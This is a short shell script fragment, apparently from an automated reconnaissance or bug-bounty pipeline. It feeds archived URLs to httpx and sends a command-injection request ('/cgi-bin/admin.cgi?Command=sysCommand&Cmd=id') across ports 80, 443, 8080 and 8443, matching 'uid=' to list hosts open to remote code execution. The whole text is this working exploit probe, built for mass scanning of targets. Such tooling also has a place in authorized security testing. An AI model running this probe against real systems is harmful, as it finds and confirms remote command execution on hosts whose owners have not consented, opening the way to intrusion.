...
cat ~/recon/$target/$domainPath/Vulnerability/waybackurls.txt | httpx -path "/cgi-bin/admin.cgi?Command=sysCommand&Cmd=id" -nc -ports 80,443,8080,8443 -mr "uid=" -silent  -o  ~/recon/$target/$domainPath/Vulnerability/RCE.txt
echo ""
